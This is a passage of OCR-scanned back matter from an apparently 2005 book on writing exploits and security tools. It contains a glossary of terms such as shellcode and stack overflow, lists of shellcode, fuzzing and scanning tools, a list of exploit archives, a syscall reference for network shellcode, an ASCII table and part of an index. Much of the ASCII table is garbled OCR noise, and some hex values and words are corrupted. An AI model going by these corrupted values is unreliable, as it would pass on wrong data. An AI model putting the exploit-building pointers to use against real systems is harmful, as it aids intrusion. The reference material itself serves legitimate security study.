Procedural Language Programs written in a procedural language may be viewed as a 
sequence of instructions, where data at certain memory locations are modified at each 
step. Such programs also involve constructs for the repetition of certain tasks, such as 
loops and procedures.The most common procedural language is C. 
Program A program is a collection of commands that may be understood by a com-
puter system. Programs may be written in a high-level language, such as Java or C, or in 
low-level assembly language. 

Glossary* Appendix A 
631 
Programming Language Programs are written in a programming language. There is 
significant variation in programming languages.The language determines the syntax and 
organization of a program, as well as the types of tasks that may be performed. 
Register The register is an area on the processor used to store information. All proces-
sors perform operations on registers. On Intel architecture, eax, ebx, ecx, edx, esi, and edi 
are examples of registers. 
Sandbox A sandbox is a construct used to control code execution. Code executed in a 
sandbox cannot affect outside systems.This is particularly useful for security when a user 
needs to run mobile code, such as Java applets. 
Shellcode Traditionally, shellcode is bytecode that executes a shell. Shellcode now has a 
broader meaning, to define the code that is executed when an exploit is successful.The 
purpose of most shelkodes is to return shell addresses, although many sbellcodes exist 
for other purposes, such as breaking out of a chroot shell, creating a file, and proxying 
system calls. 
Signed Signed integers have a sign bit that denotes the integer as signed. A signed 
integer can also have a negative value. 
Software B u g Not all software bugs are vulnerabilities. If a software bug is impossible 
to leverage or exploit, then the bug is not a vulnerability A software bug could be as 
simple as a misaligned window within a GUI. 
SPI The Service Provider Interface (SP1) is used by devices to communicate with soft-
ware. SPI is normally written by the manufacturer of a hardware device to communicate 
with the operating system. 
SQL SQL stands for Structured Query Language, Database systems understand SQL com-
mands, which are used to create, access, and modify data. 
Stack The stack is an area of memory that is used to hold temporary data. The stack 
grows and shrinks throughout the duration of a program's runtime. Common buffer 
overflows occur in the stack area of memory. When a buffer overrun occurs, data is 
overwritten to the saved return address, enabling a malicious user to gain control. 
Stack Overflow A stack overflow occurs when a buffer has been overrun in the stack 
space. When this occurs, the return address is overwritten, allowing for arbitrary code to 
be executed. The most common type of exploitable vulnerability is a stack overflow. 
String functions such as strcpy and strcat are common starting points when looking for 
stack overflows in source code. 

632 
Appendix A * Glossary 
strcpy/strncpy Both strcpy and strncpy have security implications. The strcpy LIBC 
function call is more commonly mis implemented because it copies data from one buffer 
to another without a size limitation; therefore, if the source buffer is user input, a buffer 
overflow can most likely occur.The strncpy LIBC' function call adds a size parameter to 
the strcpy call; however, the size parameter could be miscalculated if it is incorrectly 
dynamically generated or does not account for a trailing NULL. 
Telnet A network service that operates on port 23.Telnet is an older insecure service 
that makes possible remote connection and control of a system through a D O S prompt 
or U N I X Shell.Telnet is being replaced by SSH, which is an encrypted and securer 
method of communicating over a network. 
Unsigned Unsigned data types, such as integers, either have a positive value or a value 
of zero. 
Virtual Machine A virtual machine is a software simulation of a platform that can 
execute code. A virtual machine allows code to execute without being tailored to the 
specific hardware processor. This allows for the portability and platform-independence of 
code. 
Vulnerability A vulnerability is an exposure that has the potential to be exploited. 
Most vulnerabilities that have real-wo rid implications are specific software bugs. 
However, logic errors are also vulnerabilities. For instance, the lack of requiring a pass-
word or allowing a NULL password is a vulnerability. This logic or design error is not 
fundamentally a software bug. 
x86 x86 is a family of computer architectures commonly associated with Intel. The x86 
architecture is a little-endian system.The common PC runs on x86 processors. 

Appendix B 
Security Tool 
Compendium 
Source Code Auditing 
Application Defense 
www. applicationdefe nse.com 
Prexis 
www.ouncelabs.com 
Fortify Software 
www. fo rti fy s o ftware .com 
CodeAssuTe 
www. sec u re s o ft ware. co m 
FlawFinder 
w ww. dwheeler.com/ flaw fi nd er / 
ITS4 
www. cigital.com/its4/ 
RATS 
w w w. s ec u re s w. c o m / rats/ 
Splint 
www.splint.org/ 
633 
«
! 

634 
Appendix B * Security Tool Compendium 
Shellcode Tools 
• 
Metasplok 
ww w. me tasplo i t. c om / 
• 
MOSDEF 
www.immunitysec.com/MOSOEF/ 
• 
Hellkit 
http://teso.scenc.at/releases/hellkit-l.2.tar.gz 
• 
Shell Forge 
www. cartel-securite.fr/pbiondi/shellforge.html 
• 
HOON 
http://felinemenace.org/~nd/HOON.tar.bz2 
• 
InlineEgg 
http://community.corest.com/~-gera/FrogrammingPearls/rnlineEgg.html 
• 
ADMmutate 
www.ktwo.ca/security.html 
Debuggers 
• 
GDB 
http://sources.redhat.com/gdb/ 
• 
GVD 
http://libre.act-europe.fr/gvd/ 
• 
OllyDebug 
http://home.t-online.de/honie/OHydbg/ 
• 
Turbo Debug for Borland C 5.5 
www.borland.com/bcppbuilder/turbodebugger/ 
• 
Microsoft Debuggers 
www microsoft.com/whdc/ddk/debugging/default.mspx 
• 
Compuware Driver Studio (SoftlCE) www.compuware.com/ 
products/driverstudio/782_ENG_HTML.htm 
• 
IDA Fro 
w w w. data re s c u e. c o m/ 
Compilers 
• 
Microsoft Visual Studio 
ww w. mi cro s o ft. c o m 

Security Tool Compendium • Appendix B 
635 
• 
GCC 
www. gii u. o rg/ so ft ware / gcc / gc c. html 
• 
DJGPP 
www.delorie.com/djgpp 
• 
CygWin 
http://cygwin.com 
• 
MinGW32 
http://mingw.sourceforge.net/ 
• 
Borland C 5.5 
www.borland.com/bcppbuilder/freecompiler/ 
• 
Watcom C 
www. openwatcom. org 
• 
nasm 
http://nasm.sourceforge.net/ 
• 
MASM 
www.easystreet.com/~jkirwan/pctools.html 
• 
MASM32 
www.movsd.com/masm.htm 
• 
Assembly Studio 
www. ne gato ry. c om / a s ms tu dio / 
• 
ASMDev 
http://asmdev.tripod.com/ 
Hardware Simulators 
• 
VMware 
w w w. vm ware. c o m 
• 
Bochs 
http://bochs.sourceforge.net/ 
• 
PearPC 
http://pearpc.sourceforge.net/ 
• 
Virtual PC 
www.microsoft.com/windows/virtualpc/default.mspx 

636 
Appendix B * Security Tool Compendium 
Security Libraries 
• 
Libpcap 
ww w. tcpdump.org/ 
• 
LibWhisker 
www. wiretrip.net/tfp/lw. asp 
• 
Libnet 
www.packetfactory.net/projects/libnet/ 
• 
Libnids 
ww w. pac ke tfa cto r y. n e t/ p roj e c ts /li b ni ds/ 
• 
Libexploit 
www.packetfactory.net/projccts/libexploit/ 
• 
Libdnet 
http://libdnet.sourceforge.net/ 
• 
Lcrzo 
www.laurentconstantin.com/en/lcrzo/ 
• 
Privman 
http://opensource.iiailabs.com/privman/ 
• 
Dyninst 
www. dyninst.org/ 
• 
LibVoodoo 
www.u-n-f.com/releases/Libvoodoo/ 
• 
Whip cap 
http://vvinpcap.polito.it/ 
Vulnerability Analysis 
• 
SPIKE 
www.immunitysec.com/spike.html 
• 
FuzzerServer 
www.atstake.com/research/tools/vulnerability_scanning/ 
• 
lOphtwatch 
ww w. a tsta ke. co m/ resea re h / tool s / vu lne rab ili ty_sc a nning/10 pht - watc h. ta r. gz 
• 
Share fuzz 
www. atstake.com/research/tools/vulnerabili ty_sc anning/sharefuzzl.O.tar.gz 
• 
COM Bust 
www.atstake.com/research/tools/vulnerability_scanniiig/COMbust.zip 

Security Tool Compendium • Appendix B 
637 
• 
Bruteforce Exploit Detector 
http: / /snake-basket, de/bed.html 
• 
screamingCobra 
http://cobra.lucidx.com/ 
• 
screamingCSS 
w w w. d e v i try. co m/ sc re a mingC S S. h tml 
• 
envFuzz 
www.nologin.org/main.pl?action=codeView&codeId=15& 
Network Traffic Analysis 
• 
Ethereal 
www. ethereal.org 
• 
Tcpdump 
w w w. tcp du m p. o rg 
• 
WinDump 
http://windump.polito.it/ 
• 
Snort 
www.snort. org 
• 
Ettercap 
http://ettercap.sourceforge.net/ 
• 
TCPreplay 
http://sourceforge.net/projects/tcpreplay/ 
• 
TCPslice 
www.tcpdump.org/other/tcpslice.tar.Z 
• 
TCPtrace 
www. tcptrace.org/ 
• 
TCPflow 
w w w. c i rcl e m u d. o rg/~j els o n / soft wa re / tc pflo w/ 
• 
EtherApe 
http://etherape.sourceforge.net/ 
• 
NetDude 
http://netdude.sourceforge.net/ 
• 
Ngrep 
http://ngrep.sourceforge.net/ 

638 
Appendix B * Security Tool Compendium 
Packet Generation 
• 
Hping2 
www. hping.org/ 
• 
ISIC 
www.packetfactory.net/Projects/ISIC/ 
• 
duet 
http://libdnet.sourceforge.net/ 
• 
IRPAS 
www.phenoelit.de/irpas/docu.htnil 
• 
Paketto Keiretsu 
www. doxpara.com/paketto 
• 
fragroute 
w w w. mo n key. o rg/%7 E d u gso n g/ frag rou te / 
• 
naptha 
http://razor.bindvicw.com/publish/advisorics/adv_NAPTHA.html 
Scanners 
• 
Foundstone 
ww w. fo u n dston e. com 
• 
Application Defense 
www. applicationdefe nse.com 
• 
Retina 
www. e eye. c o m 
• 
Internet Scanner 
www.iss.net 
• 
NMAP 
www. i nsec u re. o rg/ nma p / 
• 
Scanline 
ww w. fo u n dston e. com 
• 
AMAP 
www.thc.org 
• 
Nessus 
www. nessus.org 

Appendix C 
Exploit Archives 
The following are some of the best exploit references 
and archives you will find on the Internet. These sites 
and databases represent the majority of the publicly 
available exploits that are commonly utilized to 
leverage vulnerabilities during attacks and automated 
malicious programs such as worms. These links can be 
utilized as educational references when creating or 
analyzing exploits going forward. The links are ordered 
in a hierarchy schema based upon current 
maintenance, unique technologies, user involvement, 
and sheer number of working exploits. 
639 

640 
Appendix C • Exploit Archives 
Online Exploit Archives 
• 
Securiteam 
www.securiteam.com 
• 
K-Otik 
www.k-otik.com/exploits/index.php 
• 
Packetstorm 
ww w. pac ke ts to r m s ec u r i ty. o rg 
• 
Gov Boi's Exploit Archive 
www.hack.co.za 
• 
Symantec (previously known as Security Focus) 
www.securityfocus.com 
• 
Phrack Magazine 
www. phrack.org 
• 
Last Stage of Delirium Research Group 
ww w. lsd-p 1. n e t / 
• 
Teso 
www. team-teso.net 
• 
ADM 
ftp://freclsd.net/pub/ADM 
• 
Government Security Exploit and Vulnerability Archive 
www.governmentsecurity.org/exploits.plip 
• 
Hacker's Playground 
www.hackersplayground.org/exploits.html 
• 
Fyodor's Exploit World (Pre-1998 Exploits) 
www.insecure.org/sploits.html 
• 
USSR Labs 
ww w. u ssrlabs. c o m 
• 
Outpost 9 (outdated and small) 
www.outpost9.com/exploits/exploits.htinl 

Appendix D 
Syscall Reference 
This appendix includes several descriptions of useful 
system calls. For more complete information about the 
system calls available on Linux and FreeBSD, take a look 
at the syscall man pages and the header files they refer 
to. Before trying to implement a system call in 
assembly, first try it out in a simple C program. That 
way you can become familiar with the system call's 
behavior, and this will allow you to write better code. 
t|flj 
e 
641 

642 
Appendix D * Syscall Reference 
exit( int) 
The exit system call allows you to terminate a process. It only requires one argument, an 
integer that will be used to represent the exit status of the program. The value given 
here can be used by other programs to determine whether the program terminated with 
an error. 
open( file, flags, mode ) 
Using the open call, you can open a file to read or write. Using the flags, you can 
specify whether the file should be created if it does not exist, whether the file should be 
opened read-only, and so on. The mode argument is optional and only required when 
you use the 0_CR£AT flag within the open call.The open system call returns a file 
descriptor that can be used to read from and write to. In addition, you can close the 
opened file using the file descriptor in the close system call. 
close( filedescriptor) 
The close system call requires a file descriptor as an argument. For example, this can be 
the file descriptor returned by an open system call. 
read( filedescriptor, pointer 
to buffer, amount of bytes ) 
The read function allows data to be read from the file descriptor into the buffer.The 
amount of data you want to read can be specified with the 3c argument. 
write( filedescriptor, pointer 
to buffer, amount of bytes ) 
The write function can be used to write data to a file descriptor. If you use the open 
system call to open a file, you can use the returned file descriptor in a write system call 
to write data in the file.The data is retrieved from the buffer (second argument) and the 
amount of bytes is specified in the third argument. You can also use write to write data 
to a socket file descriptor. Once a socket is opened and you have the file descriptor, just 
use it in a write system call. 
execve( file, file + arguments, environment data ) 
The almighty execve system call can be used to run a program.The first argument 
should be the program name, while the second should be an array containing the pro-
gram name and arguments. The last argument should be the environment data. 
socketcall( callnumber, arguments ) 
The socketcall system call is only available in Linux and can be used to execute socket 
function such as bind, accept, and, of course, socket. The first argument should represent 
the function number you want to use.The second argument should be a pointer to the 

Syscall Reference • Appendix D 
643 
arguments you want the function defined in argument one to receive upon execution. 
For example, if you want to execute socket(2,l,6) you need to specify the number of the 
socket function as argument one and a pointer to the arguments "2,1,6" as argument 2. 
The available functions, function numbers, and required arguments can be found in the 
socketcall man page. 
socket( domain, type, protocol ) 
Using the socket system call you can create a network socket. The domain argument 
specifies a communications domain—for example, I NET (for IP). The type of socket is 
specified by the second argument.You could, for example, create a raw socket to inject 
special crafted packets on a network.The protocol argument specifies a particular pro-
tocol to be used with the socket—for example, IP 
bind( file descriptor, sockaddr struct, size of arg 2 ) 
The bind() system call assigns the local protocol address to a socket. The first argument 
should represent the file descriptor obtained from the socket system call.The second 
argument is a struct that contains the protocol, port number, and IP address of the socket 
to bind to. 
listen ( file descriptor, number 
of connections allowed in queue ) 
Once the socket is bound to a protocol and port, you can now use the listen system call 
to listen for incoming connections.To do this, you can execute listen with the socket() 
file descriptor as argument one and a number of maximum incoming connections the 
system should queue. If the queue is 1, two connections come in; one connection will 
be queued, while the other one will be refused. 
accept ( file descriptor, 
sockaddr struct, size of arg 2 ) 
Using the accept system call, you can accept connections once the listening socket 
receives them.The accept system call then returns a file descriptor that can be used to 
read and write data from, and to, the socket. To use accept, execute it with the socket() 
file descriptor as argument one. The second argument, which can be NULL, is a pointer 
to a sockaddr structure. If you use this argument, the accept system call will put informa-
tion about the connected client into this structure.This can, for example, allow you to 
get the connected client's IP address. When using argument two, the accept system call 
will put the size of the filled in sockaddr struct in argument three. 


Appendix E 
Data Conversion 
Reference 
645 

1II 
_) 
dof Transmit B 
r-
n 
X-
N> 
u> 
yj-
n 
1 3 0 
sidle 
N l 
NJ 
/ -, 
gative Ac <now 
r;, 
Q_ 
[ j 
NJ 
-^ 
I 1 
vice Cont 
NJ 
fJ 
i ; 
vice Cont rol 3 
\n 
i : 
vice Cont 
NJ 
_'.: 
1 1 
vice Cont rol 1 
- - j 
i i 
r,j 
! 
Ol 
tyi 
J 
u-
J 
fto 
i_ 
-t. 
n 
u 
rriag 
rp 
V 
urn 
IJJ 
" 
• J 
3 
-n 
eed 
NJ 
• - : 
-3 
rtica Tab 
—* 
1 
-n 
T. 
•TJ 
o 
-n S 
03 
CO 
> 
o> 
S " 
^~ 
_i 
£ 
edg 
n 
c i 
n 
• 
- i 
rans 
n 
o 
- i 
a 
art o 
~* 
Text 
o 
I
C
0
0
^
0
1
U
1
J
>
W
I
O
J
O 
^J 
o 
N> 
^, 
O 
O 
o 
o 
— 1 
—1 
—' 
01 
O 
N ; 
Ol 
O 
f 1 
o 
o 
— 1 
~^ 
o 
ui 
O 
NJ 
L/l 
O 
t 1 
a 
n 
^ 
I > 
—' 
J> 
o 
N J 
J > 
a 
! 1 
O 
o 
^ 
: 
J 
o 
u, 
o 
KJ 
U. 
o 
' 
•• 
n 
o 
1-1 
— 1 
—' 
NJ 
O 
N-l 
NJ 
O 
t 1 
o 
o 
n 
—i 
O 
o 
NJ 
C! 
: i 
a 
n 
n 
! > —* 
o 
o 
NJ 
O 
O 
( 1 
O 
o 
f "1 
< ) 
o 
o 
in 
O 
^, 
o 
f 1 
r; 
f> 
—
•
' 
—i 
—» 
— i 
O 
m 
O 
01 
O 
t ) 
o 
f . 
—' 
— 1 
—* 
o 
o 
• 
o 
L/i 
O 
t ! 
o 
f l 
^ 
— i 
r> 
• 
* 
o 
n 
o 
J > 
o 
<) 
Q 
O 
-^ 
-^ 
o 
o 
o 
o j 
O 
UJ 
• 
! 1 
O 
' 1 
~^ 
n —* 
—i 
o 
> 
o 
NJ 
o 
( 1 
a 
c i 
^ 
^i 
-^ 
o 
o 
to 
o 
o 
[ 1 
o 
n 
—
•
' 
o 
( 1 
—' 
o 
IX 
o 
o 
o 
[ 1 
e 
n —' 
n 
o 
c 
o 
- - j 
o 
n 
- j 
o 
< > 
o 
n 
o 
-^ 
1 
o 
Ol 
o 
I - ! 
Ol 
o 
! 1 
o 
o 
o 
^
L 
-^ 
o 
o 
u-
o 
f l 
Ol 
o 
[ 1 
o 
n 
o 
—i 
(> —* 
o 
J> 
o 
f l 
J> 
o 
( ) 
o 
D 
O 
— i 
o 
c 
o 
Lu 
O 
o 
LU 
O 
( 1 
e (-> 
o 
^1 
-^ 
—' 
o 
NJ 
a 
r i 
NJ 
o 
•' 1 
o 
-'1 
o 
f l 
-^ 
o 
o 
o 
n 
o 
( i 
o 
n 
o 
n 
o 
—* 
oding 
erse Engineering Exploits a 

Data Conversion Reference * Appendix E 
647 
S 3 In w « ifl « 
LU 
l/l 
UJ 
LL 
O 
C£ 
3 
X 
> 
M 
^ 
u u u u u u u u 
fe in 
03 
, 
_ • 
r- 
s 
OH ^ f 
LT( 1 ^ 
* * £ £ £ £ 
1c 1c 1c j ^ 1c 1c 
VI 1/1 1/1 1/1 VI VI -
Ol O » II 
« £ *; * 
<- O 
O 
" -
o o o 
o o o 
o o o 
o o o 
O i - fN 
m m 
o o o 
f i i r t i ^ i n i o N c o o i O r - r^i JVI ^r in ^ N 
m m m m f T i ( n ( n f T i ^ | - - ^ - ' d - ^ | - ^ | - - d - ^ - ^ | -
C 3 c $ c 3 c 3 c 3 o 3 o 3 c 3 c 3 o 3 o 3 c 3 c 0 o 3 o 3 c 0 
*
-
O
<
-
O
*
-
O
<
-
O
<
-
O
^
O
<
-
O
^
O
<
-
O
^
O
T
-
^ — O O ^ — ^ — O O r - r - O O r — r - O O T - r - O O ' — * ~ 
0
^
<
-
>
-
>
-
0
0
0
0
<
-
^
^
<
-
O
O
O
O
T
-
>
-
^
T
-
i - ^ ^ i - ^ o o o a a o o O ' - ' - ' - ' - ' - i - i - ' -
.
-
,
-
.
-
>
-
>
-
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0 
O O O O O ' - ' - ' - ' - ' - i - i - ' - ' - t - i - ' - ' - i - i - T -
o o o o o o o o o o o o o o o o o o o o o 
o o o o o o o o o o o o o o o o o o o o o 
C f \ r r ) m r r \ r r \ r $ r t r t r t T $ * t - ' 3 - r T i n i S i \ f t i n t r i i S i u ^ i n 
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O
O 
CO Ol < CO U O 
O r - r M m ^ | - L n i D r ^ o o a i < f l Q i J Q L i J u _ 
f N f S f S f S * N r s i r \ i * N r M r \ i r \ i f S f S r \ i f M r M 
, U A: Syngres s Publishing, 2005. p 647. 

Character Description 
Zero Digit 
One Digit 
Two Digit 
Three Digit 
Four Digit 
Five Digit 
Six Digit 
Seven Digit 
Eight Digit 
Nine Digit 
Colon 
Semicolon 
Less-Than Sign 
Equals Sign 
Greater-Than Sign 
Question Mark 
At Sign 
Capital A 
Capital B 
Capital C 
Capital D 
Capital E 
Capital F 
Capital G 
Decimal 
48 
49 
50 
51 
52 
53 
54 
55 
56 
5/ 
58 
59 
60 
61 
62 
63 
64 
65 
66 
6/ 
68 
69 
70 
71 
Hex 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
3A 
3B 
3C 
3D 
3E 
31 
40 
41 
42 
43 
44 
45 
46 
47 
Octal 
060 
061 
062 
063 
064 
065 
066 
067 
070 
0/1 
072 
073 
074 
075 
076 
077 
100 
101 
102 
103 
104 
105 
106 
107 
Binary 
00110000 
00110001 
00110010 
00110011 
00110100 
00110101 
00110110 
00110111 
00111000 
00111001 
00111010 
00111011 
00111100 
00111101 
00111110 
00111111 
01000000 
01000001 
01000010 
01000011 
01000100 
01000101 
01000110 
01000111 
HTML 
&#48; 
&#49; 
S#50; 
S # 5 1 ; 
&#52; 
8.#53; 
S#54; 
S#55; 
&#56; 
&#57, 
&#58; 
S#59; 
&#60; 
S # 6 1 ; 
&#62, 
&#63, 
S#64; 
&#65; 
&#66, 
&#67; 
S#68; 
&#69; 
&#70, 
&#71; 
Code 
0 
1 
7 
3 
4 
5 
6 
7 
8 
9 
Shift; 
"t 
Shift, 
= 
Shift. 
Shift/ 
Shift 2 
Shift A 
Shift B 
Shift C 
Shift D 
Shift E 
Shift F 
Shift G 
Character 
0 
1 
2 
3 
4 
5 
6 
7 
8 
9 
] 
< 
= 
> 
? 
@ 
A 
B 
C. 
D 
E 
f 
G 
Appi 
1 
x 
* 
I 
? 
1 
3 
J i I 
Continued 

n 
» 
s 
n 
A) 
rf> 
JJ 
LO 
_> 
CO 
A 
l*J 
LU 
•:• 
Q_ 
QJ 
ET O O 
(C 
fli 
m 
* -n 
n n n n n n n n n n n n n n n n n 
S
U
Q
j
Q
j
f
l
j
i
U
Q
j
Q
j
Q
j
Q
j
Q
J
i
u
i
U
Q
j
Q
J
i
u
E
U
Q
j
Q
j 
fkg_ 
iu_ 
m 
a 
Sj 
£ < C 
Qj 
Qj 
QJ 
QJ 
£U 
iU 
QJ 
QJ 
Z 
£ 
fl) 01 
Qj 
Qj 
A 
• - 
— 
a: 
•«J ^1 ^1 
Ol 
1^1 
^ 
k/i Ln Ln k/i 
•n 
m 
<^ 
n 
u> u; 
UJ uo 
^ j 
^ 
LH 
^ 
j i u i i / i u i y i n u i j i u i y i L ' i 
( D > ( O C O M 0 1 U l ^ l J J r O - ' 
I j J W W W N J H W W W W W N J - ' - ' - ' 
W N - ' D ^ ( n U l J > W W - ' O M a i U l 
J> 
W N> -» 
O 
o o o o o o o o o o o o o o o o o o o o o o o o 
o o o o o o o o o o o o o o o o o o o o o o o o 
- » - > - > - » - » - i - i - » - » - > - > - » - » - » - » - > 0 0 0 0 0 0 0 0 
^
.
-
i
-
i
^
.
^
^
^
^
O
O
O
O
O
O
O
O
^
'
-
'
^
^
-
'
-
'
-
'
-
' 
-
.
^
-
•
-
^
O
O
O
O
-
'
^
^
-
'
O
O
O
O
-
'
-
'
-
'
^
O
O
O
O 
-
*
—
I
O
O
-
^
^
O
O
-
*
—
*
0
0
-
» 
- * 0 0 — * — * 0 0 — * — * 0 0 
-
^
O
^
O
-
'
O
^
O
-
'
O
^
O
-
'
O
-
'
O
-
'
O
^
O
^
O
^
O 
L n . t > U J I v j - i O * j O O O - ^ l ( T i L n . C > u > s > - i o i C O O - ^ I C ^ L n . t > 
L>J 
S j 
* * 
1 
oi 
1 / l W l / t L ^ U ^ U ^ l / l L ^ L / l L ^ L / l L ^ L ^ U n L / l L ^ l / ^ L / l L / l 
* * * * * * * * * * * * * * * * * * * 
< 

Character Description 
Back Quote 
Lowercase A 
Lowercase B 
Lowercase C 
Lowercase D 
Lowercase E 
Lowercase F 
Lowercase G 
Lowercase H 
Lowercase 1 
Lowercase J 
Lowercase K 
Lowercase L 
Lowercase M 
Lowercase N 
Lowercase 0 
Lowercase P 
Lowercase Q 
Lowercase R 
Lowercase S 
Lowercase T 
Lowercase U 
Lowercase V 
Lowercase W 
Decimal 
96 
97 
98 
99 
100 
101 
102 
103 
104 
10b 
106 
107 
108 
109 
110 
111 
112 
113 
114 
l i b 
116 
117 
118 
119 
Hex 
60 
61 
62 
63 
64 
6b 
66 
67 
68 
69 
6A 
6B 
6C 
6D 
6L 
61 
70 
71 
11 
73 
74 
7b 
/6 
77 
Octal 
140 
141 
142 
143 
144 
145 
146 
147 
150 
151 
152 
153 
154 
155 
156 
l b / 
160 
161 
162 
163 
164 
165 
166 
167 
Binary 
01100000 
01100001 
01100010 
01100011 
01100100 
01100101 
01100110 
01100111 
01101000 
01101001 
01101010 
01101011 
01101100 
01101101 
01101110 
01101111 
01110000 
01110001 
01110010 
01110011 
01110100 
01110101 
01110110 
01110111 
HTML 
&#96; 
&#97; 
&#98; 
&#99; 
&#100; 
& # 1 0 1 ; 
S#102; 
S#103; 
&#104; 
8.#105; 
S#106; 
S#107; 
&#108; 
S#109; 
&#110; 
&#111; 
&#112; 
8.#113; 
8,#114; 
&#115; 
&#116; 
&#117; 
8.#118; 
&#119; 
Code 
A 
B 
C 
D 
E 
F 
G 
H 
I 
J 
K 
L 
M 
N 
O 
P 
Q 
R 
5 
T 
U 
V 
W 
Character 
a 
b 
c 
d 
e 
f 
9 
h 
I 
J 
k 
I 
m 
n 
o 
P 
q 
r 
s 
t 
u 
V 
w 
o 
Appi 
1 
H 
* 
s 
? 
I 
3 
J i 1 
Continued 

Character Description 
Decimal 
Hex 
Octal 
Binary 
Lowercase X 
Lowercase Y 
Lowercase Z 
Left Brace 
Vertical Bar 
Right Brace 
Tilde 
Delta 
120 
121 
122 
123 
124 
125 
126 
127 
78 
79 
7A 
7B 
7C 
7D 
7E 
7F 
170 
171 
172 
173 
174 
175 
176 
177 
01111000 
01111001 
01111010 
01111011 
01111100 
01111101 
01111110 
01111111 
HTML 
Code 
Character 
&#120; 
& # 1 2 1 ; 
&#122; 
S#123; 
&#124; 
&#125; 
&#126; 
S#127; 
X 
Y 
Z 
Shift [ 
Shift \ 
Shift] 
Shift ' 
X 
y 
z 
{ 
I 
} 
A 
n 
1 


Index 
A character, 499-504,537 
abstract data types 
with CM, 25 
with C + + , 4 
with object-oriented pro-
gramming, 15—1 6 
accept ( file descriptor, sockaddr 
struct, size of arg 2 ), 643 
Mccpl() function 
portable network program-
ming and, 290-293 
in server-side socket pro-
gramming, 442 
Winsock 
WSADATA object 
creation, 152 
accept system call. 385 
Active Template Library (ATL) 
attributes, 563-567, 589 
C++ templates, 546-547 
client technologies, 547-55(1 
described, 588 
overview, 546 
server technologies, 550-563 
addition-based integer wrapping. 
472-474 
address spaces, Windows 32-bit, 
553 
addressing problem, shell code 
arguments, pushing, 340-341 
call andjmp trick, 339-340 
Overview of, 360 
ADM1NDIRS variables, 603, 
604 
VnadvaiKcd data structure 
exploit data in, 529 
in exploit process, 527-528 
advanced features, Java, 16 
AFJNET 
socket options, 116 
UDP socket creation, 109 
in Winsock client application, 
157 
WSADATA object creation, 
150 
Aitel, David, 56 
Andreessen, Marc, 15 
Apacbe Web server, exploits, 423 
API. Sec Application 
Programming Interface 
application 
integration, 573-575, 
584-587 
targeting vulnerabilities, 
422-423 
troubleshooting tools, 171 
Application Programming 
Interface (API) 
definition of, 626 
portable network program-
ming and, 280 
arbitrary payloads, 496 
Arboi, Michael, 67 
arguments 
c omman d-line pro cess in g, 
263-267 
pushing in shellcode, 
340-341 
system call, 343-344 
Winsock client application, 
154 
@ARGV variable, 47 
arithmetic operators 
NASL, 71-72 
in Perl, 42 
arrays 
in NASL script, 70 
in Perl, 41-42 
assembler, 336-337 
assembly code, 626 
assembly instructions, 358-359 
assembly programming language 
setuid shellcode in, 350 
Windows shellcode, 354—359 
Windows vs. UNIX, 339 
writing sbellcode, 334, 
335-339 
assignment operators, 43 
ATL. See Active Template 
Library 
_ATL_ATTRIBUTES, 589 
_AtlModnk Global Variable 
COM in-process server 
implementation, 559—560 
COM out-of-process server 
implementation, 561 —5 62 
attack signatures, 594-595 
attack trees, 8 
attack vector 
determining for exploit, 
»
498-499 
overwriting return address, 
499-504' 
automated garbage collection, 
•6.25 
' 
B 
bad characters 
decoder for, 528 
determining, 514—515 
encoders for payload and, 536 
in payload, 518, 519, 521 
setting, 530 
BadChars key, 530 
Bagley, David, 427 
banner, %rab () function, 168 
BEGIN_COM_MAP, 552 
BEGlN_ENTRY_POINT, 570, 
590 
Bell Labs, 3 
Berkeley Software Distribution 
(BSD) sockets 
function of, 100 
in general, 100-101 
network scanning with TCP 
sockets, 127-139 
network scanning with UDiJ 
sockets, 118-127 
portable network program-
ming and, 274-276, 329 
socket options, 116-118 
TCP clients/servers, 101-107 
threading/parallelism, 
139-140 
UDP clients/server, 107-116 
Winsock vs., 171 
big endian 
definition of, 626 
processor types and, 226-229 
binary string (BSTR) datatype, 
548 
bind( file descriptor, sockaddr 
struct, size of arg 2 ), 643 
bindQ function 
portable network program-
ming and,285-287 
in server-side socket pro-
gramming, 442 
UDP socket bound with, 1 15 
in Winsock server applica-
tion. 161 
binding 
for exploits, 440-444, 488 
port binding shellcode, 
345-346 
/bin/sh, 348-349 
bitwise operators, 73 
blind class payloads, 519 
blind spoofing, TCP, 429-430 
booleans, in NASL, 70, 96 
bounds checking, 5 
break statement, 75-76 
BSD sockets. .See Berkeley 
Software Distribution 
(BSD) sockets 
BSTR (binary string) datatype, 
548 
buffer, 626 
buffer overflow 
C/C++ vulnerabilities, 4-5 
653 
•A S , 

654 
Index 
definition of, 626 
NASI, script for, (>f> 
remote, malformed client kev, 
459-471 
UW POP2, 48CM87 
Winsock to for remote buffer 
overflow, 174-176 
, Sec also Microsoft Internet 
Information Server (US) 4.0 
.HTR Buffer Overflow 
bugs 
format string attacks, 
424-429 
integer bug exploits, 
472-477, 489 
targeting vulnerabilities, 
422-423 
built-in functions, NASL, 77 
byte array buffer, 209 
byte ordering, 226—229 
bytecode, 626 
bytes, 501-503,504 
c 
c 
assembly code version of C 
program, 337-339 
BSD sockets used with, 100 
classes, 10—11 
data types, 5—8 
definition of, 626 
errors, 591 
flow control, 8—9 
fouriei" estimation case study, 
12-14 
functions, 9-10 
"Hello, World!" program, 5 
important points about, 61 
language characteristics, 3-5 
pi at fori n porting, 219 
porting to/from NASL, 86, 
89-93 
socket descriptor reuse shell-
code in,346-348 
C libraries (LI13C) 
integer bug exploits and, 472 
open-source software, stack 
overflow exploits in, 449 
stack overflows and, 446—449, 
488 
C# 
business case for migrating to, 
24 
classes, 30-31 
command line II' address 
parsing case study, 32-40 
data types, 26-27 
definition of, 626 
flow control, 27-29 
in general, 23-24 
"Hello, World!" program, 26 
important points about, 61 
language characteristics, 
24-26 
methods, 29-30 
threading, 31-32 
C++ 
BSD sockets used with, 100 
classes, 10-11 
data types, 5-8 
definition of, 626 
errors, 591 
flow control, 8—9 
fourier estimation case study, 
12 14 
functions, 9—10 
"Hello, World!" program, 5 
important points about, 61 
language characteristics, 3—5 
platform porting, 219 
porting to NASI, from, 
89-93 
templates, ATL and, 546-547 
CALL EAX opcode 
finding return address, 
510-511 
inserting return address, 
513-514 
CALL instruction 
overwriting return address, 
507 
tor shellcodc addressing 
problem, 339-340 
CANVAS, 56 
case study 
command line IP address 
parsing, 32-40 
man input validation error, 
432-434 
NASL script, 82-86 
Open SSL SSLv2 malformed 
client key remote buffer 
